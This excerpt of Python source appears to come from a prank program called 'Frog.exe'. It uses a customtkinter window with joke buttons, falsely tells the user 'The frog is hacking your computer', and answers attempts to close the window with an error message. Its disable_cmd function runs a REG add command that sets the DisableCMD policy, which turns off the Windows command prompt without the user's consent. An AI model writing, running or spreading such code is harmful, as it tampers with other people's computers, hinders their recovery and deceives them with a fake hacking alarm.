...
def on_closing():
    messagebox.showerror("Frog.exe", "ErrorClose :)")
...
def open_frog():
    ...
    btn2 = ctk.CTkButton(master = btn_frame, text = "Throw the computer in the trash", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "orange", corner_radius = 7, hover = False, command = throw)
    ...
    btn5 = ctk.CTkButton(master = btn_frame, text = "Tie the frog with a cravat", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "pink", corner_radius = 7, hover = False, command = fuck)
...
def intro():
    ...
    messagebox.showinfo("Frog.exe", "The frog is hacking your computer")
    open_frog()
...
def disable_cmd():
    os.system("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableCMD /t REG_DWORD /d 2 /f")
